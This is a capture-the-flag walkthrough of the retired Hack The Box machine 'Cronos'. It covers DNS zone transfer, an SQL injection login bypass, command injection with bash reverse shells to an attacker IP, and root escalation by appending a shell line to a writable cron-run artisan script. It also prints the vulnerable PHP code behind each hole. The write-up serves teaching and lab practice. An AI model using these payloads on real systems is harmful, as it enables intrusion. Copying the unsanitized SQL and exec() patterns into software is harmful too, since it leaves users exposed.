# Cronos - Write-up

## Overview
**Name:** Cronos  
**Difficulty:** Medium  
**Methodology:** DNS enumeration → SQL Injection → Auth bypass → Command Injection → Cronjob abuse → Root shell  

Cronos provides an excellent introduction to several core offensive security concepts: DNS enumeration, SQL injection, authentication bypasses, command injection, reverse shells, and privilege escalation via cronjobs. Despite its age, the machine showcases vulnerabilities still seen in real-world environments today.

In this writeup, I enumerate DNS to discover hidden subdomains, bypass an admin login panel using SQLi, obtain command execution through an unsafe `exec()` call, escalate privileges using a writable Laravel `artisan` script executed by a root cronjob, and finally review the application code (“Beyond Root”) to understand why each vulnerability was possible.


---

## Box Information

| Field | Value |
|-------|-------|
| **Name** | Cronos |
| **OS** | Linux (Ubuntu 16.04 Xenial) |
| **Difficulty** | Medium |
| **Release Date** | 22 Mar 2017 |
| **Retire Date** | 26 May 2017 |
| **Points** | 30 |
| **Creator** | ch4p |
---

## 1. Enumeration

```bash
nmap -sV -sC -Pn 10.129.227.211
```

Open ports:

- 22/tcp – OpenSSH 7.2p2

- 53/tcp – ISC BIND 9.10.3-P4

- 80/tcp – Apache 2.4.18 (Ubuntu default page)

Service detection:

```nmap -sC -sV -p 22,53,80 10.129.227.211``` 

Port 80 serves only the Apache default page, suggesting virtual hosting. DNS becomes our next target.

---

## 2. DNS Enumeration

Query the nameserver directly:

```
nslookup
> server 10.129.227.211
> 10.129.227.211
```

Reveals:

```
ns1.cronos.htb
```

Attempt a DNS zone transfer:

```
dig axfr @10.129.227.211 cronos.htb
```

Success:

```
cronos.htb
www.cronos.htb
admin.cronos.htb
ns1.cronos.htb
```

Add to ```/etc/hosts```:

```echo "10.129.227.211 cronos.htb www.cronos.htb admin.cronos.htb ns1.cronos.htb" | sudo tee -a /etc/hosts```

Bruteforcing with Gobuster confirms the same three:

```gobuster dns -d cronos.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt```

---

## 3. Web Enumeration

www.cronos.htb displays a Laravel landing page. Gobuster yields only css, js, and index.php.

A Laravel session cookie is set, but no useful endpoints appear.

admin.cronos.htb presents a login page. Testing default creds fails. 

This becomes the foothold.

---

## 4. SQL Injection

Testing payloads reveals SQLi:

```admin' OR '1'='1``` works directly, without having to enter a password.

Successfully bypassing authentication redirects to:

```welcome.php  (Net Tool v0.1)```

---

## 5. Command Injection to www-data Shell

```welcome.php``` contains the vulnerable form:

```
Select: ping or traceroute
Input: host
```

Simply testing the injection:

```8.8.8.8; id``` works and the output is printed to the page


For the reverse shell, we set up a listener:

```nc -lvnp 4444 ```

Payload:

```
8.8.8.8; bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'
```

Shell obtained:

```www-data@cronos:/var/www/admin$ ```

---

## 6. Privilege Escalation (Cronjob Abuse)

Enumerating cronjobs:

```cat /etc/crontab```

Reveals:

```* * * * * root php /var/www/laravel/artisan schedule:run ```

This means:

- Every minute, root executes the artisan PHP script.
- If www-data can modify this file we can get automatic root RCE.

Check permissions:

```
ls -l /var/www/laravel/artisan
```

Output:

```
-rwxr-xr-x 1 www-data www-data 1646 ...
```

Writable by www-data, vulnerability confirmed.

We inject a reverse shell into the file:

``` echo "system('bash -c \"bash -i >& /dev/tcp/10.10.14.X/6969 0>&1\"');" >> /var/www/laravel/artisan```

Listener:

```
nc -lvnp 6969
```

Within 60 seconds, due to the cron schedule:

```
root@cronos:/var/www/laravel#
```

Root shell obtained.

---

## 7 Beyond Root

### 7.1 SQLi Root Cause

```/var/www/admin/index.php:```

```php

$myusername = $_POST['username'];
$mypassword = md5($_POST['password']);

$sql = "SELECT id FROM users WHERE username = '".$myusername."' and password = '".$mypassword."'";
```

Unsanitized user input
MD5 password hashing
Uses row count to determine authentication success
Single admin user in DB, any SQLi returns one row, auto-login

### 7.2 Command Injection Root Cause

```welcome.php:```

```php
$command = $_POST['command'];
$host = $_POST['host'];
exec($command.' '.$host, $output, $return);
```

Both fields concatenated directly into an OS command. No sanitization.

---

## 9. Summary

| Stage | Vulnerability                      | Result              |
| ----- | ---------------------------------- | ------------------- |
| Recon | DNS zone transfer                  | Discovered 3 vhosts |
| Login | SQL injection                      | Admin panel access  |
| Panel | Command injection                  | Shell as www-data   |
| PE    | Writable root-executed cron script | Root shell          |


Pwned!